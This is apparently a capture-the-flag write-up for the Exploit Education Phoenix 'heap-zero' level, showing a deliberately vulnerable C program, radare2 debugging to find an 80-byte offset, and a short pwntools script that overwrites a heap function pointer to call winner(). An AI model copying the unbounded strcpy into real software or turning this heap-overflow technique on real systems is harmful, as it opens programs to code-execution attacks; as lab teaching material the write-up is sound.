---
description: 'http://exploit.education/phoenix/heap-zero/'
---

# heap0

## Source

Luckily it gives us the source:

```c
#include <err.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

struct data {
  char name[64];
};

struct fp {
  void (*fp)();
  char __pad[64 - sizeof(unsigned long)];
};

void winner() {
  printf("Congratulations, you have passed this level\n");
}

void nowinner() {
  printf(
      "level has not been passed - function pointer has not been "
      "overwritten\n");
}

int main(int argc, char **argv) {
  struct data *d;
  struct fp *f;

  if (argc < 2) {
    printf("Please specify an argument to copy :-)\n");
    exit(1);
  }

  d = malloc(sizeof(struct data));
  f = malloc(sizeof(struct fp));
  f->fp = nowinner;

  strcpy(d->name, argv[1]);

  printf("data is at %p, fp is at %p, will be calling %p\n", d, f, f->fp);
  fflush(stdout);

  f->fp();

  return 0;
}
```

## Analysis

So let's analyse what it does:

* Allocates two chunks on the heap
* Sets the `fp` variable of chunk `f` to the address of `nowinner`
* Copies the first command-line argument to the `name` variable of the chunk `d`
* Runs whatever the `fp` variable of `f` points at

The weakness here is clear - it runs a random address on the heap. Our input is copied there after the value is set and there's no bound checking whatsoever, so we can overrun it easily.

### Regular Execution

Let's check out the heap in normal conditions.

```text
$ r2 -d -A heap0 AAAAAAAAAAAA            <== that's just a parameter
$ s main; pdf
[...]
0x0040075d      e8fefdffff     call sym.imp.strcpy         ; char *strcpy(char *dest, const char *src)
0x00400762      488b45f8       mov rax, qword [var_8h]
[...]
```

We'll break right after the strcpy and see how it looks.

```text
[0x004006f8]> db 0x00400762
[0x004006f8]> dc
hit breakpoint at: 0x400762
```

![The Expected Two Chunks](../../.gitbook/assets/image%20%285%29.png)

If we want, we can check the contents.

![Chunk with our input](../../.gitbook/assets/image%20%282%29.png)

![The Chunk with the Function Address](../../.gitbook/assets/image%20%283%29.png)

So, we can see that the function address is there, after our input in memory. Let's work out the offset.

### Working out the Offset

Since we want to work out how many characters we need until the pointer, I'll just use a De Bruijn Sequence.

```text
$ ragg2 -P 200 -r
```

```text
$ r2 -d -A heap0 AAABAACAADAAE...
```

Let's break **on** and **after** the `strcpy`. That way we can check the location of the pointer then immediately read it and calculate the offset.

```text
[0x004006f8]> db 0x0040075d
[0x004006f8]> db 0x00400762
[0x004006f8]> dc
hit breakpoint at: 0x40075d
```

![The chunk before the strcpy](../../.gitbook/assets/image.png)

So, the chunk with the pointer is located at `0x2493060`. Let's continue until the next breakpoint.

```text
[0x0040075d]> dc
hit breakpoint at: 0x400762
```

![Corrupted](../../.gitbook/assets/image%20%281%29.png)

radare2 is nice enough to tell us we corrupted the data. Let's analyse the chunk again.

![](../../.gitbook/assets/image%20%284%29.png)

Notice we overwrote the `size` field, so the chunk is much bigger. But now we can easily use the first value to work out the offset \(we could also, knowing the location, have done `pxq @ 0x02493060`\).

```text
[0x00400762]> wopO 0x6441416341416241
80
```

So, fairly simple - 80 characters, then the address of `winner`.

## Exploit

```python
from pwn import *

elf = context.binary = ELF('./heap0')

payload = (b'A' * 80 + flat(elf.sym['winner'])).replace(b'\x00', b'')

p = elf.process(argv=[payload])

print(p.clean().decode('latin-1'))
```

{% hint style="info" %}
We need to remove the null bytes because `argv` doesn't allow them
{% endhint %}

